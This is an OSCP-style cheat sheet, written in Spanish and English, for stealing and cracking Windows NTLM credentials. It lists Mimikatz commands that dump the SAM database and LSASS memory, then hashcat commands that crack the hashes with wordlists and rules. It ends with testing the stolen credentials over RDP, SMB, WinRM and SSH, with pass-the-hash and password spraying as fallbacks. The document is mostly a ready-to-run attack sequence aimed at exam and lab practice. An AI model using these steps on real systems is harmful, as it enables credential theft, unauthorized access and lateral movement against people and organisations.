NTLM Credential Dumping & Cracking (OSCP Style)

1. Identify Users
net user
Get-LocalUser

Qué buscas:

  • Usuarios no estándar
  • Service accounts
  • Users reutilizables para lateral movement
2. Privilege Check
whoami /priv
whoami /groups

Qué buscas:

  • SeDebugPrivilege → REQUIRED for Mimikatz
  • Admin / elevated context
3. Run Mimikatz
.\mimikatz.exe

Initial setup:

privilege::debug
token::elevate

Qué hace:

  • privilege::debug → habilita SeDebugPrivilege
  • token::elevate → obtiene token SYSTEM
4. Dump NTLM Hashes (SAM)
lsadump::sam

Qué buscas:

  • NTLM hashes de usuarios locales
  • Usuarios no default (ej: nelly)
  • Hashes reutilizables o crackeables
5. Dump Live Credentials (Optional)
sekurlsa::logonpasswords

Qué buscas:

  • Plaintext passwords (si disponibles)
  • NTLM hashes en memoria
  • Kerberos tickets
6. Extract NTLM Hash

Copia el hash del usuario objetivo:

3ae8e5f0ffabb3a627672e1600f1ba10

Guárdalo en un archivo:

echo 3ae8e5f0ffabb3a627672e1600f1ba10 > user.hash

Importante:

  • No añadir espacios ni saltos extra
  • Formato limpio = necesario para cracking
7. Identify Hash Type
hashcat --help | grep -i ntlm

Resultado:

  • NTLM → mode 1000
8. Crack NTLM Hash
hashcat -m 1000 user.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

Qué hace:

  • Usa wordlist + rules (mutations)
  • Intenta encontrar password en keyspace
  • Más potente que brute-force puro

Output esperado:

HASH:password
9. Validate Credentials

Probar credenciales en servicios:

RDP
SMB
WinRM
SSH

Qué buscas:

  • Acceso exitoso
  • Privilegios del usuario
  • Posible escalada o lateral movement
10. If Cracking Fails
  • Try password reuse across services
  • Use Pass-the-Hash instead of cracking
  • Try different wordlists (seclists, custom leaks)
  • Use different rule sets
  • Consider password spraying if multiple users exist
OSCP Attack Flow
  1. Enumerate users
  2. Gain admin privileges
  3. Dump SAM / LSASS with Mimikatz
  4. Extract NTLM hashes
  5. Crack with Hashcat
  6. Validate credentials
  7. If not crackable → Pass-the-Hash
